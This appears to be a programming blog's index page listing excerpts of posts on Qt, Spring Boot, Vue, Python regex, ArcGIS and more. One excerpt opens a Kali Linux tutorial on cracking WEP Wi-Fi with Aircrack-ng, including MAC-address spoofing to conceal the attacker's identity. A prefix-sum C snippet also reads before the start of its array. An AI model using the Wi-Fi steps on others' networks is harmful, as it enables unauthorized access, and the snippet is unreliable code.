<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/030daa515f9922d73798fc1a65902f19/" rel="bookmark">
			【Qt设计中常见控件、布局选项和属性详解】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录：
引言Qt简介常见控件
3.1 QLabel
3.2 QLineEdit
3.3 QPushButton
3.4 QComboBox
3.5 QCheckBox
3.6 QRadioButton
3.7 QSlider
3.8 QProgressBar
3.9 QTextEdit
3.10 QTableView布局选项
4.1 QVBoxLayout
4.2 QHBoxLayout
4.3 QGridLayout
4.4 QFormLayout
4.5 QStackedLayout
4.6 QTabWidget常见属性
5.1 设置文本属性
5.2 设置尺寸属性
5.3 设置颜色属性
5.4 设置布局属性
5.5 设置事件属性
5.6 设置样式属性结论 1.引言 引言：
Qt是一个功能强大的跨平台应用程序开发框架，被广泛应用于图形用户界面（GUI）的开发。它提供了丰富的控件和布局选项，以及各种属性和方法，使开发者能够轻松创建功能完善、易于使用的应用程序。
在Qt设计中，控件是构建用户界面的基本元素，它们用于显示信息、接收用户输入、触发操作等。Qt提供了众多常见的控件，如标签、按钮、文本框、下拉列表等，每个控件都有自己独特的功能和属性。
除了控件，布局选项也是Qt设计中不可或缺的部分。布局选项用于管理控件的位置和大小，使得界面能够自动适应不同的窗口大小和分辨率。Qt提供了多种布局选项，如垂直布局、水平布局、网格布局等，开发者可以根据需要选择适合的布局方式。
属性是控件和布局的特性和行为的表示，它们可以用于调整外观、尺寸、样式等。Qt提供了各种属性，如文本属性、尺寸属性、颜色属性、布局属性等，开发者可以根据需求对控件和布局进行自定义设置，以实现所需的界面效果。
在本篇博客中，我们将详细介绍Qt设计中常见的控件、布局选项和属性。我们将逐个探讨每个控件的功能和用法，介绍各种布局选项的特点和适用场景，以及如何设置和利用属性来实现界面的个性化和优化。通过学习和理解这些内容，读者将能够更好地运用Qt框架进行应用程序的设计和开发。
接下来，让我们深入探索Qt设计中常见的控件，了解它们的特点和用法，以及如何利用布局选项和属性来构建出精美、灵活的用户界面。
2. Qt简介 Qt是一种跨平台的应用程序开发框架，由Qt Company开发。它提供了丰富的工具和功能，用于开发图形用户界面（GUI）应用程序。Qt采用C++编写，并提供了多种语言的绑定，如Python、Java等，使开发者能够在不同的操作系统上使用相同的代码。Qt的设计理念是"写一次，到处运行"，这意味着开发者可以在不同的平台上部署他们的应用程序，包括Windows、macOS、Linux等。
3. 常见控件 在Qt中，有许多常见的控件可用于构建用户界面。下面介绍了一些常见的控件及其功能：
3.1 QLabel QLabel是用于显示文本或图像的控件。它可以用于显示静态文本，也可以与其他控件配合使用。开发者可以设置文本、字体、颜色等属性，还可以通过设置图片来显示图像。
3.2 QLineEdit QLineEdit是一个单行文本输入框控件，用于接收用户输入的文本。它支持多种输入模式，例如普通文本、密码、数字等。开发者可以设置输入限制、校验器、提示信息等属性，以满足不同的需求。
3.3 QPushButton QPushButton是一个常见的按钮控件，用于触发操作或执行特定的功能。通过设置文本、图标、快捷键等属性，可以使按钮具有更加丰富的表现形式。按钮还可以响应鼠标点击事件，开发者可以为按钮绑定特定的槽函数，实现自定义的行为。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/030daa515f9922d73798fc1a65902f19/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bf95d54ebfff8f4805184ba5090fe481/" rel="bookmark">
			前缀和算法给定n个整数a1，a2，……，an，求它们两两相乘再相加的和，即 S = a1⋅a2 &#43; a1⋅a3 &#43; ⋯ &#43; a1⋅an &#43; a2⋅a3 &#43; ⋯ &#43; an−2⋅an−1 &#43; an−2⋅a
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		给定n个整数a1，a2，……，an，求它们两两相乘再相加的和，即 S = a1⋅a2 + a1⋅a3 + ⋯ + a1⋅an + a2⋅a3 + ⋯ + an−2⋅an−1 + an−2⋅an + an−1⋅an
我们可以将S改写成这种形式：
而对于（2+3+4+5+6+7）、（3+4+5+6+7）、......（6+7）、（7)如果采取
for(int i=0;i&lt;n;i++)
for(int j=i+1;j&lt;n;j++)
方式，如果n非常大，显然花费时间很长。我们采用前缀和方法可以快速计算
前缀和数组的每一项元素是原数组的前n项和
#include &lt;stdio.h&gt; int num[1000010]; //数组 long long prenum[1000010];//前缀和数组 int main() { int n, x; long long sum = 0; scanf("%d", &amp;n); for (int i = 0; i &lt; n; i++) { scanf("%d", &amp;num[i]); if (i == 0) prenum[i] = num[i]; prenum[i] = prenum[i - 1] + num[i]; } for (int i = 0; i &lt; n; i++) { sum += num[i] * (prenum[n - 1] - prenum[i]); } printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bf95d54ebfff8f4805184ba5090fe481/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e9cd3d9502a3b97b0bfaf21c26e54279/" rel="bookmark">
			Python学习之批量word文档转pdf并统计其页码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pypdf2是一个Python模块，可以用来读取、写入和操作PDF文件。要安装pypdf2模块，请按照以下步骤操作：
确保你已经安装了Python。你可以在终端或命令提示符中输入python --version来检查Python是否已安装。
pypdf2模块的安装：
ModuleNotFoundError: No module named ‘PyPDF2’
安装完成后，你可以在Python中使用pypdf2模块来读取、写入和操作PDF文件。
例如，要读取一个PDF文件中的文本内容，你可以在Python脚本中导入pypdf2模块，然后使用PdfFileReader类读取文件并遍历每个页面。下面是一个简单的示例代码：
import pypdf2 pdf_file = pypdf2.PdfFileReader('example.pdf') for page_num in range(pdf_file.getNumPages()): page = pdf_file.getPage(page_num) print(page.extractText()) 这将打印出PDF文件中的每个页面的文本内容。
注意：
因PyPDF2 版本更新原因，一些类和函数已经过时，想要采用替代函数，例如获取pdf 页数 getNumPages 替换为直接使用 len(reader.pages)。
下面是两个报错的提示，把函数替换掉就行
PyPDF2.errors.DeprecationError: PdfFileReader is deprecated and was removed in PyPDF2 3.0.0. Use PdfReader instead.
PyPDF2.errors.DeprecationError: reader.getNumPages is deprecated and was removed in PyPDF2 3.0.0. Use len(reader.pages) instead.
利用Python代码实现批量word文档转换成PDF格式 并对转换的文档，进行页码统计，如下（代码示例） # -*- coding:utf-8 -*- import os # 导入系统功能模块 from win32com.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e9cd3d9502a3b97b0bfaf21c26e54279/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa7f379fa5bc350faee3919124ea6f13/" rel="bookmark">
			Spring Boot 单元测试，保姆级教程！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、 单元测试的概念 概念：
单元测试（unit testing），是指对软件中的最小可测试单元进行检查和验证。在Java中单元测试的最小单元是类。
单元测试是开发者编写的一小段代码，用于检验被测代码的一个很小的、很明确的功能是否正确。执行单元测试，就是为了证明这段代码的行为和我们期望是否一致。
单元测试引用：
众所周知，通过spring initialize创建的Spring Boot项目会在Maven中自动携带很多starter依赖：
其中包含了一个名为spring-boot-starter-test的依赖，本文是围绕这个依赖展开。
Spring Boot 基础就不介绍了，推荐看这个免费教程：
https://github.com/javastacks/spring-boot-best-practice
Spring Boot中引入单元测试很简单，添加如下依赖（即spring-boot-starter-test依赖）：
&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; spring-boot-starter-test有如下几个库：
spring-boot-starter-testUML图：
二、单元测试的作用 在没有接触单元测试之前我们是怎么做测试的？一般有两个方法：
在时间允许的情况下，编写单元测试是程序员对代码的自测，这是对自己代码的负责。
写单元测试的两个动机：
保证或验证实现功能。
保护已经实现的功能不被破坏。
三、Spring Boot引入的MockMvc的概念 什么是Mock? 在面向对象的程序设计中，模拟对象（英语：mock object）是以可控的方式模拟真实对象行为的假对象。在编程过程中，通常通过模拟一些输入数据，来验证程序是否达到预期结果。
为什么使用Mock对象？ 使用模拟对象，可以模拟复杂的、真实的对象行为。如果在单元测试中无法使用真实对象，可采用模拟对象进行替代。
MockMvc的概念 MockMvc是由spring-test包提供，实现了对Http请求的模拟，能够直接使用网络的形式，转换到Controller的调用，使得测试速度快、不依赖网络环境。同时提供了一套验证的工具，结果的验证十分方便。
接口MockMvcBuilder，提供一个唯一的build方法，用来构造MockMvc。主要有两个实现：StandaloneMockMvcBuilder和DefaultMockMvcBuilder。
另外，如果你近期准备面试跳槽，建议在Java面试库小程序在线刷题，涵盖 2000+ 道 Java 面试题，几乎覆盖了所有主流技术面试题。
MockMVC的基本步骤 (1) mockMvc.perform执行一个请求。
(2) MockMvcRequestBuilders.get(“XXX”)构造一个请求。
(3) ResultActions.param添加请求传值
(4) ResultActions.accept()设置返回类型
(5) ResultActions.andExpect添加执行完成后的断言。
(6) ResultActions.andDo添加一个结果处理器，表示要对结果做点什么事情，比如处使用print()输出整个响应结果信息。
(7) ResultActions.andReturn表示执行完成后返回相应的结果。
四、Service层的单元测试 第一步：
Spring Boot中单元测试类写在src/test/java目录下，你可以手动创建具体测试类，也可以通过IDEA自动创建测试类，如下图：（注：点选并打开相应代码界面，再点击菜单栏的Navigate）
第二步：
按照第一步的方法，点击测试后，出现图一 的对话框（如果想要测试的类已经存在测试类了会被列出来，也可以重新创建一个新的测试类），点击”Create New Test…”会弹出图二 的对话框，可以选择是否生成setUp以及要测试的成员方法等：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fa7f379fa5bc350faee3919124ea6f13/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63ec12b57099146fdd8aa4a87b38c064/" rel="bookmark">
			关于 C/C&#43;&#43; 中的 switch 语句，您可能不知道
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于 C/C++ 中的 switch 语句，您可能不知道 关于如何通过VC++中的逆向工程执行开关/案例的讨论
介绍 许多编程语言，如 C/C++、C#、Java 和 Pascal 都提供了让我们实现选择逻辑的语句。在某些情况下，它是 的良好替代方法，使代码更清晰、更具可读性。在实践中使用时，您可能想知道：switchif-then-elseswitch
块在运行时如何执行？switch对于一长串条件，它的运行速度是否比一长串更快？if-then-else对于 n 个条件，时间复杂度是多少？switch C/C++ 标准定义了语言元素的规范，但它没有说明如何实现该语句。每个供应商都可以自由使用任何实现，只要它符合标准。本文通过一些不同条件下的示例，讨论在 Visual C++ 中运行语句时会发生什么情况。我们将使用 Microsoft Visual Studio IDE 分析这些示例，因为它可以在编译时生成相应的程序集列表。因此，假设对英特尔（x86）汇编语言有一般的了解。正如您稍后看到的，这里的所有结果都基于逆向工程，因此本文从来都不是对编译器中实现的全面描述。如果你正在学习汇编语言编程，这篇文章可能是阅读的学习材料。switchswitchswitch
我们的第一个示例是 switch1.cpp，这是一个常用的简单块，如下所示：
C++
#include "functions.h"int main()
{
int i =3; // or i =20
switch (i)
{
case 1: f1(); break;
case 2: f2(); break;
case 5: f1(); break;
case 7: f2(); break;
case 10: f1(); break;
case 11: f2(); break;
case 12: f2(); break;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/63ec12b57099146fdd8aa4a87b38c064/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca0cec68e4d353bca92f0641aeeec16f/" rel="bookmark">
			Springboot内置的工具类之CollectionUtils示例讲解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 实际业务开发中，集合的判断和操作也是经常用到的，Spring也针对集合的判断和操作封装了一些方法，但是最令我惊讶的是，我在梳理这些内容的过程中发现了一些有趣的现象，我的第一反应是不敢相信，再想一想，没错，我是对的。所以强烈建议大家可以认真看完这篇文章，这一篇绝对有价值，因为有趣的是我我竟然发现了Spring的两个bug。
org.springframework.util.CollectionUtils 集合的判断 boolean hasUniqueObject(Collection collection)
从源码注释上看，是用于判断 List/Set 中的每个元素是否唯一，即 List/Set 中不存在重复元素。但这里要告诉大家千万不要用这个方法，因为这个方法有bug，为什么呢？下面是Spring-core-5.2.13.RELEASE.jar中的源码，且看12行，细心的人会发现两个对象之间比较是否相等用的是!=。还记得“==”和“equals”的区别吗？“==”操作符专门用来比较两个变量的值是否相等，equals()方法是用于比较两个独立对象的内容是否相同。所以这里如果集合中的元素是数值，可以用“==”比较，如果是普通的引用对象，就得不到正确的结果了。
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
public static boolean hasUniqueObject(Collection&lt;!--?--&gt; collection) {
if (isEmpty(collection)) {
return false;
}
boolean hasCandidate = false;
Object candidate = null;
for (Object elem : collection) {
if (!hasCandidate) {
hasCandidate = true;
candidate = elem;
}
else if (candidate != elem) {
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ca0cec68e4d353bca92f0641aeeec16f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/019da35af1cbb69d26503442ce857040/" rel="bookmark">
			vite-plugin-pwa配置详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vite-plugin-pwa配置详解 前提：前端域名和后端服务域名相同时，用window.open新开页面下载或者导出文件，项目中导出和下载功能失效，原因是，域名相同走缓存 实现service worker离线缓存以前需要自己编写sw.js文件内容，比较复杂。 谷歌提供了workbox-*库来协助写配置。
vite-plugin-pwa就是帮你使用workbox结合一些模板代码自动生成sw.js，实现0配置
一：vite-plugin-pwa的简单使用 默认缓存所有的js.css.html // vite.config.ts/js import { VitePWA } from "vite-plugin-pwa"; export default { plugins: [ VitePWA() ] } 二：先看VitePWAOptions的配置 function VitePWA(userOptions?: Partial&lt;VitePWAOptions&gt;): Plugin[]; interface VitePWAOptions { // @default process.env.NODE_ENV or "production" mode?: 'development' | 'production'; // @default 'public' srcDir?: string; // @default 'dist' outDir?: string; // @default 'sw.js' filename?: string; // @default 'manifest.webmanifest' manifestFilename?: string; // @default 'generateSW' strategies?: 'generateSW' | 'injectManifest'; // @default same as `base` of Vite's config scope?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/019da35af1cbb69d26503442ce857040/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a52e4537b7fd98b6def3b00017c74f26/" rel="bookmark">
			mavonEditor-文档
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		mavonEditor图片展示 安装 npm install mavon-editor --save 引入 import mavonEditor from 'mavon-editor'; import 'mavon-editor/dist/css/index.css'; 使用 &lt;template&gt; &lt;div class="mavonEditor"&gt; &lt;no-ssr&gt; &lt;mavon-editor :toolbars="markdownOption" v-model="handbook"/&gt; &lt;/no-ssr&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { data() { return { markdownOption: { bold: true, // 粗体 ... // 更多配置 }, handbook: "#### how to use mavonEditor in nuxt.js" }; } }; &lt;/script&gt; &lt;style scoped&gt; .mavonEditor { width: 100%; height: 100%; } &lt;/style&gt; API文档 props name 名称type 类型default 默认值describe 描述valueString初始值languageStringzh-CN语言选择，暂支持 zh-CN: 简体中文, zh-TW: 正体中文 ， en: 英文 ， fr: 法语， pt-BR: 葡萄牙语， ru: 俄语， de: 德语， ja: 日语fontSizeString14px编辑区域文字大小scrollStyleBooleantrue开启滚动条样式(暂时仅支持chrome)boxShadowBooleantrue开启边框阴影boxShadowStyleString0 2px 12px 0 rgba(0, 0, 0, 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a52e4537b7fd98b6def3b00017c74f26/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/be06737d8eea8eea521878b5c0444e6b/" rel="bookmark">
			VUE3 &#43; TS &#43; PINIA &#43; LESS &#43; AXIOS &#43; VUE-ROUTER &#43; ELEMENT-PLUS创建完整项目并配置完成全步骤
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		VUE3 + TS + PINIA + LESS + AXIOS + VUE-ROUTER + ELEMENT-PLUS创建完整项目并配置完成全步骤 1、创建项目使用npm使用yarn使用pnpm效果 2、pinia安装及使用安装使用pinia 页面使用demopinia持久化插件 3、安装less及使用安装配置vite.config.js使用 4、vue-router安装及使用安装使用路由简单应用 5、axios安装及使用安装 6、vue+ts设置@别名vite.config.ts配置tsconfig.json配置 7、element-plus安装安装引入方式可查看官方文档中的相关内容，选择所需的引入形式如：自动引入自动引入注意事项： 1、创建项目 使用npm 方式1： npm init vite@latest 方式2： npm init vite@latest my-vue-app -- -- template vue 说明： my-vue-app 为所创建项目名称 ；template vue为创建一个项目模板
使用yarn yarn create vite 使用pnpm pnpm create vite 效果 2、pinia安装及使用 安装 npm install pinia 使用 在main.ts或main.js文件中引入pinia并创建容器挂载到根实例上
import { createPinia } from 'pinia' const app = createApp(App) const pinia = createPinia() // pinia使用 app.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/be06737d8eea8eea521878b5c0444e6b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01b099e43d87c10bad8b94b5d5db1a27/" rel="bookmark">
			【全网最全】Python正则表达式详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		正则表达式使用单个字符串来描述、匹配一系列符合某个句法规则的字符串. Python 自1.5版本起增加了re 模块，它提供 Perl 风格的正则表达式模式。
re 模块 re 模块使 Python 语言拥有全部的正则表达式功能。re 模块也提供了与这些方法功能完全一致的函数，这些函数使用一个模式字符串做为它们的第一个参数。
match 基本使用 match(匹配的规则字符串, 目标子符串)
from re import match, search if __name__ == '__main__': pattern = "hello" str1 = "hell1word hello" # result = match(pattern, str1) result = search(pattern, str1) print(type(result)) print(result) # print(result.span()) # 返回查找到字符串的索引 # print(result.group()) # 返回查找到字符串的列表 表示字符 import re ''' . 不能匹配换行 \n, \s 可以匹配换行 \n ''' v = re.match('.','a') v = re.match('.','1') v = re.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/01b099e43d87c10bad8b94b5d5db1a27/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eda8610e207b9a5aa70f343da057ff99/" rel="bookmark">
			ArcGIS系统要求
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据库 OraclePostgreSQLPostGIS ArcGIS 10.2
Oracle 11g R2（64 位）11.2.0.4
Oracle 12c R2（64 位）12.2.0.1
PostgreSQL 9.0.5-9.2.2（64 位）PostGIS 1.5.1-2.0ArcGIS 10.4PostgreSQL 9.2.14-9.4.5（64 位） PostGIS 2.1-2.2ArcGIS 10.6 Oracle 11g R2（64 位）11.2.0.4
Oracle 12c R2（64 位）12.2.0.1
Oracle 18c（64 位）18.4.0.0.0
Oracle 19c（64 位）19.3.0.0.0 PostgreSQL 9.4.8-9.6.8
（64 位）
PostGIS 2.2-2.3ArcGIS 10.6.1PostgreSQL 9.5.12-10.3PostGIS 2.2-2.4ArcGIS 10.7PostgreSQL 9.5.12-11.2（64 位）PostGIS 2.2-2.5.1ArcGIS 10.8PostgreSQL 9.6.15-12.2（64 位）PostGIS 2.3-3.0.1ArcGIS Pro 2.5PostgreSQL 9.6.15-11.7（64 位）PostGIS 2.3-3.0.1ArcGIS Pro 2.6PostgreSQL 9.6.17-12.2（64 位）PostGIS 2.3-3.0.1ArcGIS Pro 2.7PostgreSQL 10.14-12.4（64 位）PostGIS 3.0.1 操作系统 WindowsLiunxArcGIS 10.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eda8610e207b9a5aa70f343da057ff99/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3396c90d8b40bce3e7924905f51eea0d/" rel="bookmark">
			企业宣传片背景音乐 有哪些震撼的推荐？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.《Epic Cinematic Trailer》- Audiojungle2.《Rise of the Titans》- Audiojungle3.《Inspirational Epic Trailer》- Audiojungle4.《Triumph》- Audiojungle5.《Ultimate Battle》- Audiojungle6.《Epic and Inspiring》- Audiojungle7.《Epic Trailer》- Audiojungle8.《Heroes Arise》- Audiojungle9.《Intense Trailer》- Audiojungle10.《Epic Heroic Trailer》- Audiojungle
这些音乐都具有强烈的节奏感和高潮迭起的曲线，能够让观众感受到强烈的视听冲击力和燃情激烈的情感体验，非常适合用于企业宣传片的背景音乐。
以上内容是由旺影整理发布，旺影宣传片制作平台提供海量活动宣传视频制作模板，在线免费制作，包含企业周年庆、年会等宣传视频在线制作。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/13facc6eb1c60dd41a29e4f5097e9fb5/" rel="bookmark">
			订单管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本专栏介绍了使用Qt开发的一些小型桌面软件，其中包括软件功能介绍、软件截图、主要代码等内容。此外，本专栏还提供完整的软件源码和安装包供有需要的同学下载。我的目标是开发一些简洁美观且实用的客户端小软件，如果能够为大家提供有用的软件或对学习有益的代码，那就更好了。同时，也欢迎有想法的朋友提出建议，我会不定期地更新一些小软件并上传到该专栏。
订单管理系统 1、功能介绍2、软件截图3、部分代码4、代码下载5、安装包下载 1、功能介绍 该项目是帮客户开发的管理订单的软件系统，该系统的功能包括订单的增删改查、历史订单、收藏订单、订单详情等。这个订单管理系统是由Qt写的客户端和Go写的服务端组成的。后面会提供客户端以及服务端的可执行程序。可完整体验该项目，客户端的源码也可以直接下载，但服务端的代码涉及客户资料，所以服务端只提供可执行程序。
2、软件截图 3、部分代码 主页代码
MainWidget::MainWidget(QWidget *parent) : QWidget(parent) , ui(new Ui::MainWidget) { ui-&gt;setupUi(this); QSettings *m_settings = new QSettings("systemset.ini", QSettings::IniFormat); setWindowTitle(m_settings-&gt;value("title").toString()); DataCenter::Instance()-&gt;logInfo()-&gt;appServer = m_settings-&gt;value("url").toString(); setWindowIcon(QIcon(":/resource/ico.jpg")); delete m_settings; DataCenter::m_stackWidget = ui-&gt;stackedWidget; //全部订单 m_itemListAll = new ItemList(ItemType::ALL,this); ui-&gt;stackedWidget-&gt;addWidget(m_itemListAll); DataCenter::m_itemListAll = m_itemListAll; m_itemListAll-&gt;updateItems(); DataCenter::m_itemListCurrent = m_itemListAll; //创建订单 m_createItem = new CreateItem(this); ui-&gt;stackedWidget-&gt;addWidget(m_createItem); //历史订单 m_itemListHistory = new ItemList(ItemType::HISTORY,this); ui-&gt;stackedWidget-&gt;addWidget(m_itemListHistory); DataCenter::m_itemListHistory = m_itemListHistory; //进行中订单 m_itemListDoing = new ItemList(ItemType::DOING,this); ui-&gt;stackedWidget-&gt;addWidget(m_itemListDoing); DataCenter::m_itemListDoing = m_itemListDoing; //收藏订单 m_itemListStar = new ItemList(ItemType::STAR,this); ui-&gt;stackedWidget-&gt;addWidget(m_itemListStar); DataCenter::m_itemListStar = m_itemListStar; } http请求代码
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/13facc6eb1c60dd41a29e4f5097e9fb5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa0e49be0194e238f62e6966bdc11671/" rel="bookmark">
			Kali-linux使用Aircrack-ng工具破解无线网络
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Aircrack-ng是一款基于破解无线802.11协议的WEP及WPA-PSK加密的工具。该工具主要用了两种攻击方式进行WEP破解。一种是FMS攻击，该攻击方式是以发现该WEP漏洞的研究人员名字（Scott Fluhrer、Itsik Mantin及Adi Shamir）所命名；另一种是Korek攻击，该攻击方式是通过统计进行攻击的，并且该攻击的效率要远高于FMS攻击。本节将介绍使用Aircrack-ng破解无线网络。
9.2.1 破解WEP加密的无线网络 Wired Equivalent Privacy或WEP（有线等效加密）协议是对在两台设备间无线传输的数据进行加密的方式，用以防止非法用户窃听或侵入无线网络。不过密码分析学家已经找出WEP好几个弱点，因此在2003年被Wi-Fi Protected Access（WPA）淘汰，又在2004年由完整的IEEE 802.11i标准（又称为WPA2）所取代。本小节将介绍破解WEP加密的无线网络。
使用Aircrack破解使用WEP加密的无线网络。具体操作步骤如下所示。
（1）使用airmon-ng命令查看当前系统中的无线网络接口。执行命令如下所示：
输出的信息表示，当前系统中存在一个无线网络接口。从输出结果的Interface列，可以看到当前系统的无线接口为wlan0。
（2）修改wlan0接口的MAC地址。因为MAC地址标识主机所在的网络，修改主机的MAC地址可以隐藏真实的MAC地址。在修改MAC地址之前，需要停止该接口。执行命令如下所示：
或者：
root@kali:~# ifconfig wlan0 down 执行以上命令后，wlan0接口则停止。此时就可以修改MAC地址了，执行命令如下 所示：
root@kali:~# macchanger --mac 00:11:22:33:44:55 wlan0 Permanent MAC: 00:c1:40:76:05:6c (unknown) Current MAC: 00:c1:40:76:05:6c (unknown) New MAC: 00:11:22:33:44:55 (Cimsys Inc) 输出的信息显示了wlan0接口永久的MAC地址、当前的MAC地址及新的MAC地址。可以看到wlan1接口的MAC地址已经被修改。
（3）重新启动wlan0。执行命令如下所示：
输出的信息显示了无线网卡wlan0的芯片及驱动类型。例如，当前系统的无线网卡芯片为Ralink RT2870/3070；默认驱动为rt2800usb，并显示监听模式被启用，映射网络接口为mon0。
有时候使用airmon-ng start wlan0命令启用无线网卡时，可能会出现SIOCSIFFLAGS: Operation not possible due to RF-kill错误。这是因为Linux下有一个软件RF-kill，该软件为了省电会将不使用的无线设备（如WIFI和Buletooth）自动关闭。当用户使用这些设备时，RF-kill不会智能的自动打开，需要手动解锁。用户可以执行rfkill list命令查看所有设备，如下所示：
root@kali:~# rfkill list 0: ideapad_wlan: Wireless LAN Soft blocked: yes Hard blocked: no 1: phy0: Wireless LAN Soft blocked: yes Hard blocked: no 该列表中前面的编号，表示的是设备的索引号。用户可以通过指定索引号，停止或启用某个设备。如启用所有设备，执行如下所示的命令：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aa0e49be0194e238f62e6966bdc11671/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aaa8a1e88b80a4f77193cbe1ceebfbcd/" rel="bookmark">
			【qt应用软件Focus Note&#43;&#43;】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本专栏介绍了使用Qt开发的一些小型桌面软件，其中包括软件功能介绍、软件截图、主要代码等内容。此外，本专栏还提供完整的软件源码和安装包供有需要的同学下载。我的目标是开发一些简洁美观且实用的客户端小软件，如果能够为大家提供有用的软件或对学习有益的代码，那就更好了。同时，也欢迎有想法的朋友提出建议，我会不定期地更新一些小软件并上传到该专栏。
focus note++ 1、功能介绍2、软件截图3、核心代码4、代码下载5、安装包下载 1、功能介绍 Focus Note++是一款方便实用的桌面软件，类似于生活中的便签，可以帮助用户记录每天需要完成的任务。用户可以将其贴在电脑右上角，随时提醒自己今天需要完成的任务。该软件包含添加任务、删除、清空、保存到本地、从本地导入、以及显示/隐藏的功能，用户可以自由选择是否公开自己的计划。Focus Note++让任务管理变得更加轻松便捷，让你更好地掌控自己的时间和生活。
2、软件截图 3、核心代码 年代久远，该软件代码已丢失
4、代码下载 无
5、安装包下载 https://download.csdn.net/download/weixin_42538789/87817840
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b14bf0578cd3b74ee6890f1a37bfbfc/" rel="bookmark">
			How to configure grup in Linux Mint 19
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
